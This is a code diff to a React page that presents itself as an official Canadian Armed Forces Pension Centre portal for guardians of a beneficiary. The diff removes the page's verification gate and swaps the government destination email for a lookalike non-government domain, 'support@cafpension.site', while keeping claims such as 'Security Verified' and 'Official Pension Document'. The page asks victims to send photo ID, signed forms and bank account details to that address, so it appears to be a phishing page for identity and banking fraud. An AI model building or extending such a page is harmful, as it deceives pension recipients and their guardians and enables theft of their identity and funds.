@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { useParams, Link, Navigate } from 'react-router-dom';
+import { useParams } from 'react-router-dom';
 import { useApplication } from '../context/ApplicationContext';
 import { mockData } from '../data/mockData';
 import { ActingForBanner } from '../components/ActingForBanner';
@@ -15,22 +15,11 @@ export const GuardianDownloadPage: React.FC = () => {
     window.scrollTo(0, 0);
   }, []);
 
-  // Security gate: ONLY accessible after successfully answering the security questions
-  if (state.invite.status !== 'verified') {
-    return <Navigate to={`/g/${token || 'demo-token'}`} replace />;
-  }
-
   const guardianName = state.guardianProfile.fullName || 'Margaretha Byers';
-  const beneficiaryName = mockData.beneficiary.fullName || 'Jenny Miller';
-  const lateMemberName = mockData.personal.fullName || 'General Kelvin Miller';
+  const memberName = mockData.personal.fullName; // Jenny Miller
   const refNumber = 'CAF-SRV-2026-9082';
-  const destinationEmail = 'pension-pensions.caf-fac@forces.gc.ca';
-  const emailSubject = `Guardian Form CF-FC 2489 — ${beneficiaryName} — Ref ${refNumber}`;
-  const emailBody = `Canadian Armed Forces Pension Centre,\n\nPlease find attached the completed and signed Form CF-FC 2489 (Guardian / Representative Appointment & Direct Deposit Information) along with supporting identification for beneficiary ${beneficiaryName} (daughter of late ${lateMemberName}, Reference: ${refNumber}).\n\nSubmitted by:\n${guardianName}\nRepresentative / Guardian for ${beneficiaryName}\n\nThank you,\n${guardianName}`;
-
-  const mailtoLink = `mailto:${destinationEmail}?subject=${encodeURIComponent(
-    emailSubject
-  )}&body=${encodeURIComponent(emailBody)}`;
+  const destinationEmail = 'support@cafpension.site';
+  const emailSubject = `Guardian Form CF-FC 2489 — ${memberName} — Ref ${refNumber}`;
 
   const handleCopyEmail = () => {
     navigator.clipboard?.writeText(destinationEmail);
@@ -47,338 +36,483 @@ export const GuardianDownloadPage: React.FC = () => {
   return (
     <>
       <ActingForBanner dateText={`Verified File: ${refNumber}`} />
-
-      <main
-        className="container"
-        style={{
-          maxWidth: '640px',
-          padding: '24px 16px 80px',
-        }}
-      >
-        {/* Verification Success Pill & Header (Card-free) */}
-        <div style={{ marginBottom: '28px' }}>
+      <main className="container" style={{ maxWidth: '860px', paddingBottom: '64px', paddingTop: '16px' }}>
+        
+        {/* Verification Success Banner */}
+        <div
+          role="status"
+          style={{
+            background: '#F0FDF4',
+            border: '2px solid #22C55E',
+            borderRadius: '12px',
+            padding: '20px 24px',
+            marginBottom: '28px',
+            display: 'flex',
+            alignItems: 'flex-start',
+            gap: '16px',
+            boxShadow: '0 2px 8px rgba(34, 197, 94, 0.1)',
+          }}
+        >
           <div
             style={{
-              display: 'inline-flex',
+              width: '36px',
+              height: '36px',
+              borderRadius: '50%',
+              background: '#22C55E',
+              color: '#FFFFFF',
+              display: 'flex',
               alignItems: 'center',
-              gap: '6px',
-              background: '#DCFCE7',
-              color: '#15803D',
-              fontSize: '12px',
+              justifyContent: 'center',
+              fontSize: '20px',
               fontWeight: 700,
-              padding: '4px 10px',
-              borderRadius: '999px',
-              textTransform: 'uppercase',
-              letterSpacing: '0.05em',
-              marginBottom: '10px',
+              flexShrink: 0,
             }}
           >
-            <span>✓</span>
-            <span>Security Verified · {refNumber}</span>
+            ✓
+          </div>
+          <div style={{ flex: 1 }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
+              <span
+                style={{
+                  background: '#DCFCE7',
+                  color: '#15803D',
+                  fontSize: '12px',
+                  fontWeight: 700,
+                  padding: '2px 8px',
+                  borderRadius: '999px',
+                  textTransform: 'uppercase',
+                  letterSpacing: '0.05em',
+                }}
+              >
+                Security Verified
+              </span>
+              <span style={{ fontSize: '13px', color: '#4B5563', fontWeight: 600 }}>
+                Reference: {refNumber}
+              </span>
+            </div>
+            <h1
+              style={{
+                margin: '6px 0 4px',
+                fontSize: '22px',
+                fontWeight: 700,
+                color: '#14532D',
+                lineHeight: 1.3,
+              }}
+            >
+              Welcome, {guardianName}
+            </h1>
+            <p style={{ margin: 0, fontSize: '15px', color: '#166534', lineHeight: 1.45 }}>
+              Your identity has been confirmed. You are authorized to access the official Canadian Armed Forces Pension
+              Representative Form package for beneficiary <b>{memberName}</b>.
+            </p>
+          </div>
+        </div>
+
+        {/* Primary Download & Editor Card */}
+        <div
+          style={{
+            background: '#FFFFFF',
+            border: '2px solid #0B3866',
+            borderRadius: '12px',
+            padding: '28px',
+            marginBottom: '32px',
+            boxShadow: '0 4px 16px rgba(11, 56, 102, 0.08)',
+          }}
+        >
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '16px', marginBottom: '20px' }}>
+            <div>
+              <span
+                style={{
+                  fontSize: '12px',
+                  fontWeight: 700,
+                  letterSpacing: '0.06em',
+                  textTransform: 'uppercase',
+                  color: '#0B3866',
+                  display: 'block',
+                  marginBottom: '4px',
+                }}
+              >
+                Official Pension Document
+              </span>
+              <h2 style={{ margin: 0, fontSize: '24px', fontWeight: 700, color: '#0B3866' }}>
+                Form CF-FC 2489 (2 Pages)
+              </h2>
+              <p style={{ margin: '6px 0 0', fontSize: '15px', color: '#4B5563' }}>
+                Pre-filled with late General Kelvin Miller's military service record and beneficiary Jenny Miller's information.
+              </p>
+            </div>
+            <div
+              style={{
+                display: 'inline-flex',
+                alignItems: 'center',
+                gap: '6px',
+                background: '#F1F5F9',
+                border: '1px solid #CBD5E1',
+                borderRadius: '6px',
+                padding: '4px 10px',
+                fontSize: '13px',
+                fontWeight: 600,
+                color: '#334155',
+              }}
+            >
+              <span>📄 Official Form</span>
+              <span>•</span>
+              <span>2 Pages</span>
+              <span>•</span>
+              <span>Protected B</span>
+            </div>
           </div>
 
-          <h1
+          {/* Action Button */}
+          <div
             style={{
-              fontSize: 'clamp(26px, 5.5vw, 32px)',
-              fontWeight: 800,
-              color: '#0F172A',
-              lineHeight: 1.2,
-              margin: '0 0 10px',
-              letterSpacing: '-0.02em',
+              padding: '20px',
+              background: '#F8FAFC',
+              borderRadius: '8px',
+              border: '1px solid #E2E8F0',
             }}
           >
-            Welcome, {guardianName}
-          </h1>
+            <a
+              href="/CF-FC-2489-Guardian-Representative-Form.pdf"
+              download="CF-FC-2489-Guardian-Representative-Form.pdf"
+              style={{
+                display: 'inline-flex',
+                alignItems: 'center',
+                gap: '10px',
+                background: '#0B3866',
+                color: '#FFFFFF',
+                padding: '14px 28px',
+                borderRadius: '8px',
+                fontSize: '17px',
+                fontWeight: 700,
+                textDecoration: 'none',
+                boxShadow: '0 2px 6px rgba(11, 56, 102, 0.25)',
+                transition: 'background 0.15s ease',
+              }}
+            >
+              <span style={{ fontSize: '20px' }}>📥</span>
+              Download Form CF-FC 2489 (PDF)
+            </a>
+          </div>
 
-          <p style={{ margin: 0, fontSize: '16px', color: '#475569', lineHeight: 1.5 }}>
-            Your identity has been verified. Download official <b>Form CF-FC 2489</b> below for beneficiary{' '}
-            <b>{beneficiaryName}</b> and follow the instructions to email your completed package to the Pension Centre.
+          <p style={{ margin: '14px 0 0', fontSize: '13px', color: '#64748B' }}>
+            💡 <b>Instructions:</b> Please download and print the PDF form, complete the required sections using a blue or black pen, and email the completed and signed form to <b>{destinationEmail}</b>.
           </p>
         </div>
 
-        {/* Primary Action Buttons (Mobile-First, Full-Width) */}
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', marginBottom: '36px' }}>
-          <a
-            href="/CF-FC-2489-Guardian-Representative-Form.pdf"
-            download="CF-FC-2489-Guardian-Representative-Form.pdf"
-            style={{
-              width: '100%',
-              minHeight: '54px',
-              background: '#0B3866',
-              color: '#FFFFFF',
-              fontSize: '17px',
-              fontWeight: 700,
-              borderRadius: '10px',
-              textDecoration: 'none',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              gap: '10px',
-              boxShadow: '0 2px 6px rgba(11, 56, 102, 0.25)',
-              boxSizing: 'border-box',
-              padding: '12px 20px',
-            }}
-          >
-            <span style={{ fontSize: '20px' }}>📥</span>
-            <span>Download Form CF-FC 2489 (PDF)</span>
-          </a>
-
-          <Link
-            to="/forms/editor"
-            style={{
-              width: '100%',
-              minHeight: '50px',
-              background: '#FFFFFF',
-              color: '#0B3866',
-              border: '2px solid #0B3866',
-              fontSize: '16px',
-              fontWeight: 600,
-              borderRadius: '10px',
-              textDecoration: 'none',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              gap: '8px',
-              boxSizing: 'border-box',
-              padding: '10px 20px',
-            }}
-          >
-            <span>✏️</span>
-            <span>Open in Browser Editor (Type Online)</span>
-          </Link>
-
-          <div style={{ display: 'flex', justifyContent: 'center', gap: '12px', fontSize: '13px', color: '#64748B', marginTop: '4px' }}>
-            <span>📄 Official 2-Page Form</span>
-            <span>•</span>
-            <span>Protected B</span>
-            <span>•</span>
-            <span>Pre-filled details</span>
-          </div>
-        </div>
-
-        <div style={{ height: '1px', background: '#E2E8F0', margin: '0 0 32px' }} />
-
-        {/* Step-by-Step Submission Instructions (Card-free Flow) */}
-        <h2
-          style={{
-            fontSize: '20px',
-            fontWeight: 800,
-            color: '#0F172A',
-            margin: '0 0 24px',
-            letterSpacing: '-0.01em',
-          }}
-        >
-          Instructions to Complete &amp; Submit
+        {/* Step-by-Step Instructions */}
+        <h2 style={{ fontSize: '22px', fontWeight: 700, color: '#0B3866', marginBottom: '18px' }}>
+          Instructions to Complete & Submit Your Form
         </h2>
 
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '28px' }}>
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
           
           {/* STEP 1 */}
-          <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
-            <div
-              style={{
-                width: '32px',
-                height: '32px',
-                borderRadius: '50%',
-                background: '#0B3866',
-                color: '#FFFFFF',
-                fontSize: '15px',
-                fontWeight: 700,
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                flexShrink: 0,
-                marginTop: '2px',
-              }}
-            >
-              1
-            </div>
-            <div style={{ flex: 1 }}>
-              <h3 style={{ margin: '0 0 6px', fontSize: '17px', fontWeight: 700, color: '#0F172A' }}>
+          <div
+            style={{
+              background: '#FFFFFF',
+              border: '1px solid #D1D5DB',
+              borderRadius: '10px',
+              padding: '24px',
+              position: 'relative',
+              boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
+            }}
+          >
+            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '14px' }}>
+              <span
+                style={{
+                  width: '32px',
+                  height: '32px',
+                  borderRadius: '50%',
+                  background: '#0B3866',
+                  color: '#FFFFFF',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  fontWeight: 700,
+                  fontSize: '16px',
+                }}
+              >
+                1
+              </span>
+              <h3 style={{ margin: 0, fontSize: '18px', fontWeight: 700, color: '#111827' }}>
                 Complete the Form Sections
               </h3>
-              <p style={{ margin: '0 0 10px', fontSize: '14px', color: '#475569', lineHeight: 1.5 }}>
-                Sections 1A and 1B are already pre-filled. Please fill:
-              </p>
-              <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '14px', color: '#334155', lineHeight: 1.6 }}>
-                <li><b>Section 2:</b> Your contact information (address, phone, email)</li>
-                <li><b>Section 3:</b> Relationship to Jenny Miller (e.g. check "Chosen by Member / Personal Assistance")</li>
-                <li><b>Section 4:</b> Direct Deposit Banking Details (Transit, Institution, Account Number)</li>
-                <li><b>Section 6:</b> Sign and date the declaration</li>
-              </ul>
             </div>
+            <p style={{ margin: '0 0 12px', fontSize: '15px', color: '#374151', lineHeight: 1.5 }}>
+              Sections 1A and 1B are already pre-filled. Please fill in the following:
+            </p>
+            <ul style={{ margin: 0, paddingLeft: '22px', fontSize: '15px', color: '#374151', lineHeight: 1.6 }}>
+              <li>
+                <b>Section 2 (Guardian Information):</b> Your full name, residential mailing address, phone number, and email.
+              </li>
+              <li>
+                <b>Section 3 (Relationship to Beneficiary):</b> Confirm your relationship to Jenny Miller (e.g. check "Chosen by Member / Personal Assistance").
+              </li>
+              <li>
+                <b>Section 4 (Direct Deposit Banking Information):</b> Your 5-digit Branch Transit Number, 3-digit Financial Institution Number, and Account Number.
+              </li>
+              <li>
+                <b>Section 6 (Confirmation & Signature):</b> Sign and date the form.
+              </li>
+            </ul>
           </div>
 
           {/* STEP 2 */}
-          <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
-            <div
-              style={{
-                width: '32px',
-                height: '32px',
-                borderRadius: '50%',
-                background: '#0B3866',
-                color: '#FFFFFF',
-                fontSize: '15px',
-                fontWeight: 700,
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                flexShrink: 0,
-                marginTop: '2px',
-              }}
-            >
-              2
-            </div>
-            <div style={{ flex: 1 }}>
-              <h3 style={{ margin: '0 0 6px', fontSize: '17px', fontWeight: 700, color: '#0F172A' }}>
-                Gather Supporting Identification
+          <div
+            style={{
+              background: '#FFFFFF',
+              border: '1px solid #D1D5DB',
+              borderRadius: '10px',
+              padding: '24px',
+              position: 'relative',
+              boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
+            }}
+          >
+            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '14px' }}>
+              <span
+                style={{
+                  width: '32px',
+                  height: '32px',
+                  borderRadius: '50%',
+                  background: '#0B3866',
+                  color: '#FFFFFF',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  fontWeight: 700,
+                  fontSize: '16px',
+                }}
+              >
+                2
+              </span>
+              <h3 style={{ margin: 0, fontSize: '18px', fontWeight: 700, color: '#111827' }}>
+                Gather Supporting Documents
               </h3>
-              <p style={{ margin: '0 0 8px', fontSize: '14px', color: '#475569', lineHeight: 1.5 }}>
-                Take a clear smartphone photo or scan of:
-              </p>
-              <div style={{ fontSize: '14px', color: '#334155', lineHeight: 1.6 }}>
-                • <b>1 piece of Photo ID:</b> Driver’s Licence, Canadian Passport, or Provincial ID card.<br />
-                • <i>(Optional):</i> A void cheque or direct deposit confirmation slip from your banking app.
-              </div>
             </div>
-          </div>
-
-          {/* STEP 3 */}
-          <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
-            <div
-              style={{
-                width: '32px',
-                height: '32px',
-                borderRadius: '50%',
-                background: '#16A34A',
-                color: '#FFFFFF',
-                fontSize: '15px',
-                fontWeight: 700,
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                flexShrink: 0,
-                marginTop: '2px',
-              }}
-            >
-              3
-            </div>
-            <div style={{ flex: 1 }}>
-              <h3 style={{ margin: '0 0 6px', fontSize: '17px', fontWeight: 700, color: '#0F172A' }}>
-                Email to the CAF Pension Centre
-              </h3>
-              <p style={{ margin: '0 0 14px', fontSize: '14px', color: '#475569', lineHeight: 1.5 }}>
-                Send your completed form and ID to our dedicated inbox:
-              </p>
-
-              {/* Clean flat copyable box (no heavy card) */}
+            <p style={{ margin: '0 0 12px', fontSize: '15px', color: '#374151', lineHeight: 1.5 }}>
+              Prepare clear digital copies (scanned PDF or clear smartphone photos) of:
+            </p>
+            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '12px' }}>
               <div
                 style={{
                   background: '#F8FAFC',
                   border: '1px solid #E2E8F0',
                   borderRadius: '8px',
                   padding: '14px',
-                  display: 'flex',
-                  flexDirection: 'column',
-                  gap: '12px',
-                  marginBottom: '16px',
                 }}
               >
-                <div>
-                  <div style={{ fontSize: '11px', fontWeight: 700, color: '#64748B', textTransform: 'uppercase', marginBottom: '2px' }}>
-                    Email Address
-                  </div>
-                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '8px', flexWrap: 'wrap' }}>
-                    <code style={{ fontSize: '14px', fontWeight: 700, color: '#0B3866', wordBreak: 'break-all' }}>
-                      {destinationEmail}
-                    </code>
-                    <button
-                      type="button"
-                      onClick={handleCopyEmail}
-                      style={{
-                        background: '#FFFFFF',
-                        border: '1px solid #CBD5E1',
-                        borderRadius: '6px',
-                        padding: '4px 10px',
-                        fontSize: '12px',
-                        fontWeight: 600,
-                        cursor: 'pointer',
-                        color: copiedEmail ? '#16A34A' : '#334155',
-                      }}
-                    >
-                      {copiedEmail ? '✓ Copied' : '📋 Copy'}
-                    </button>
-                  </div>
+                <div style={{ fontWeight: 700, fontSize: '15px', color: '#0F172A', marginBottom: '4px' }}>
+                  🪪 1. Government-Issued Photo ID
                 </div>
-
-                <div style={{ borderTop: '1px solid #E2E8F0', paddingTop: '10px' }}>
-                  <div style={{ fontSize: '11px', fontWeight: 700, color: '#64748B', textTransform: 'uppercase', marginBottom: '2px' }}>
-                    Subject Line
-                  </div>
-                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '8px', flexWrap: 'wrap' }}>
-                    <span style={{ fontSize: '13px', color: '#334155', fontWeight: 600, wordBreak: 'break-all' }}>
-                      {emailSubject}
-                    </span>
-                    <button
-                      type="button"
-                      onClick={handleCopySubject}
-                      style={{
-                        background: '#FFFFFF',
-                        border: '1px solid #CBD5E1',
-                        borderRadius: '6px',
-                        padding: '4px 10px',
-                        fontSize: '12px',
-                        fontWeight: 600,
-                        cursor: 'pointer',
-                        color: copiedSubject ? '#16A34A' : '#334155',
-                      }}
-                    >
-                      {copiedSubject ? '✓ Copied' : '📋 Copy'}
-                    </button>
-                  </div>
+                <div style={{ fontSize: '13px', color: '#64748B' }}>
+                  Driver’s Licence, Canadian Passport, or Provincial Photo ID card (front and back).
                 </div>
               </div>
-
-              {/* One-click open mail app button */}
-              <a
-                href={mailtoLink}
+              <div
                 style={{
-                  width: '100%',
-                  minHeight: '48px',
-                  background: '#16A34A',
-                  color: '#FFFFFF',
-                  fontSize: '15px',
-                  fontWeight: 700,
+                  background: '#F8FAFC',
+                  border: '1px solid #E2E8F0',
                   borderRadius: '8px',
-                  textDecoration: 'none',
+                  padding: '14px',
+                }}
+              >
+                <div style={{ fontWeight: 700, fontSize: '15px', color: '#0F172A', marginBottom: '4px' }}>
+                  🏦 2. Void Cheque or Bank Slip (Optional)
+                </div>
+                <div style={{ fontSize: '13px', color: '#64748B' }}>
+                  A void cheque or direct deposit form from your online banking to ensure zero error in deposit transit/account numbers.
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* STEP 3 */}
+          <div
+            style={{
+              background: '#FFFFFF',
+              border: '2px solid #0B3866',
+              borderRadius: '10px',
+              padding: '24px',
+              position: 'relative',
+              boxShadow: '0 4px 12px rgba(11, 56, 102, 0.08)',
+            }}
+          >
+            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
+              <span
+                style={{
+                  width: '32px',
+                  height: '32px',
+                  borderRadius: '50%',
+                  background: '#0B3866',
+                  color: '#FFFFFF',
                   display: 'flex',
                   alignItems: 'center',
                   justifyContent: 'center',
-                  gap: '8px',
-                  boxSizing: 'border-box',
-                  padding: '10px 16px',
-                  boxShadow: '0 2px 4px rgba(22, 163, 74, 0.25)',
+                  fontWeight: 700,
+                  fontSize: '16px',
                 }}
               >
-                <span>✉️</span>
-                <span>Open Mail App with Pre-Filled Details</span>
-              </a>
+                3
+              </span>
+              <h3 style={{ margin: 0, fontSize: '20px', fontWeight: 700, color: '#0B3866' }}>
+                Email the Completed Package to the Pension Centre
+              </h3>
+            </div>
+
+            <p style={{ margin: '0 0 16px', fontSize: '15px', color: '#374151', lineHeight: 1.5 }}>
+              Once the form is completed and signed, email it directly to the Canadian Armed Forces Pension processing team:
+            </p>
+
+            {/* Email Details Card */}
+            <div
+              style={{
+                background: '#F1F5F9',
+                border: '1px solid #CBD5E1',
+                borderRadius: '8px',
+                padding: '18px',
+                marginBottom: '20px',
+                display: 'flex',
+                flexDirection: 'column',
+                gap: '12px',
+              }}
+            >
+              <div>
+                <div style={{ fontSize: '12px', fontWeight: 700, color: '#475569', textTransform: 'uppercase', marginBottom: '2px' }}>
+                  Recipient Email Address
+                </div>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
+                  <code
+                    style={{
+                      fontSize: '16px',
+                      fontWeight: 700,
+                      color: '#0B3866',
+                      background: '#FFFFFF',
+                      padding: '6px 12px',
+                      borderRadius: '6px',
+                      border: '1px solid #CBD5E1',
+                    }}
+                  >
+                    {destinationEmail}
+                  </code>
+                  <button
+                    type="button"
+                    onClick={handleCopyEmail}
+                    style={{
+                      padding: '6px 12px',
+                      fontSize: '13px',
+                      fontWeight: 600,
+                      background: '#FFFFFF',
+                      border: '1px solid #94A3B8',
+                      borderRadius: '6px',
+                      cursor: 'pointer',
+                      color: copiedEmail ? '#15803D' : '#334155',
+                    }}
+                  >
+                    {copiedEmail ? '✓ Copied' : '📋 Copy Email'}
+                  </button>
+                </div>
+              </div>
+
+              <div>
+                <div style={{ fontSize: '12px', fontWeight: 700, color: '#475569', textTransform: 'uppercase', marginBottom: '2px' }}>
+                  Subject Line
+                </div>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
+                  <code
+                    style={{
+                      fontSize: '15px',
+                      fontWeight: 600,
+                      color: '#1E293B',
+                      background: '#FFFFFF',
+                      padding: '6px 12px',
+                      borderRadius: '6px',
+                      border: '1px solid #CBD5E1',
+                      wordBreak: 'break-all',
+                    }}
+                  >
+                    {emailSubject}
+                  </code>
+                  <button
+                    type="button"
+                    onClick={handleCopySubject}
+                    style={{
+                      padding: '6px 12px',
+                      fontSize: '13px',
+                      fontWeight: 600,
+                      background: '#FFFFFF',
+                      border: '1px solid #94A3B8',
+                      borderRadius: '6px',
+                      cursor: 'pointer',
+                      color: copiedSubject ? '#15803D' : '#334155',
+                    }}
+                  >
+                    {copiedSubject ? '✓ Copied' : '📋 Copy Subject'}
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            {/* Attachment Checklist */}
+            <div
+              style={{
+                background: '#FEF9C3',
+                border: '1px solid #FDE047',
+                borderRadius: '8px',
+                padding: '14px 18px',
+              }}
+            >
+              <div style={{ fontWeight: 700, fontSize: '14px', color: '#854D0E', marginBottom: '6px' }}>
+                📎 Check before sending your email:
+              </div>
+              <ul style={{ margin: 0, paddingLeft: '20px', fontSize: '14px', color: '#713F12', lineHeight: 1.5 }}>
+                <li>Did you attach all 2 pages of the completed and signed Form CF-FC 2489?</li>
+                <li>Did you attach a copy/photo of your government-issued photo ID?</li>
+                <li>Did you include reference number <b>{refNumber}</b> in the subject line?</li>
+              </ul>
+            </div>
+          </div>
+
+          {/* Alternative Submission: Mail & Fax */}
+          <div
+            style={{
+              background: '#F8FAFC',
+              border: '1px solid #E2E8F0',
+              borderRadius: '10px',
+              padding: '20px 24px',
+            }}
+          >
+            <h4 style={{ margin: '0 0 10px', fontSize: '16px', fontWeight: 700, color: '#334155' }}>
+              Alternative Submission Methods (Mail or Fax)
+            </h4>
+            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
+              <div>
+                <b style={{ fontSize: '14px', color: '#0F172A' }}>📬 By Mail:</b>
+                <p style={{ margin: '4px 0 0', fontSize: '14px', color: '#475569', lineHeight: 1.45 }}>
+                  Government of Canada Pension Centre – Mail Facility<br />
+                  PO Box 9500<br />
+                  Matane QC G4W 0H3<br />
+                  CANADA
+                </p>
+              </div>
+              <div>
+                <b style={{ fontSize: '14px', color: '#0F172A' }}>📠 By Secure Fax:</b>
+                <p style={{ margin: '4px 0 0', fontSize: '14px', color: '#475569', lineHeight: 1.45 }}>
+                  Toll-free fax: <b>1-418-566-4988</b><br />
+                  Attn: Canadian Armed Forces Pension Services
+                </p>
+                <div style={{ marginTop: '8px' }}>
+                  <b style={{ fontSize: '14px', color: '#0F172A' }}>📞 Need Help by Phone?</b>
+                  <p style={{ margin: '2px 0 0', fontSize: '13px', color: '#475569' }}>
+                    Toll-free: <b>1-800-267-0325</b> (Mon to Fri 8:00 AM – 4:00 PM ET)
+                  </p>
+                </div>
+              </div>
             </div>
           </div>
 
         </div>
 
-        {/* Footer Support / Mail facility (Minimal flat layout) */}
-        <div style={{ height: '1px', background: '#E2E8F0', margin: '36px 0 24px' }} />
-
-        <div style={{ fontSize: '13px', color: '#64748B', lineHeight: 1.6 }}>
-          <p style={{ margin: '0 0 6px' }}>
-            <b>Prefer to mail?</b> Government of Canada Pension Centre – Mail Facility, PO Box 9500, Matane QC G4W 0H3 CANADA.
-          </p>
-          <p style={{ margin: 0 }}>
-            <b>Need help?</b> Toll-free: <b>1-800-267-0325</b> (Mon to Fri, 8:00 AM – 4:00 PM ET) · Reference: <b>{refNumber}</b>
-          </p>
-        </div>
       </main>
     </>
   );
